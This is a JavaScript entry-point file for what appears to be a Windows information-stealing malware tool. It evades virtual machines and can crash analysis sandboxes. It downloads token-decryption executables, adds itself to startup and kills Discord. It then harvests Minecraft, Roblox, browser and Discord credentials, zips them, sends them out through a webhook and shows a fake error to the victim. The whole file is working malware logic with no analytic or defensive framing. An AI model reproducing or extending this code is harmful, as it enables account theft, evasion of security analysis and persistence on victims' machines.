if (process.platform !== 'win32') process.exit();

const { sep, join } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync } = require('child_process');
const { checkVM, killTasks } = require('./functions/anti-vm');
const { runningFromExecutable, sleep } = require('./util/general');

const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
spawnSync('explorer', [tempFolder]);

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit(0);
  }
} else {
  // Download executables to decrypt tokens then start the thing
  require('./functions/download')().then(() => {
    if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
    config.discord.killProcess && require('./functions/kill-discord');
    require('./functions/grab-mc');
    require('./functions/grab-roblox');
    require('./functions/grab-browsers-data');

    require('./functions/grab-discord-token').then(async () => {
      await sleep(500);
      require('./functions/zip').then(require('./functions/webhook'));
    });
    config.fakeError && require('./functions/fake-error');
  });
}
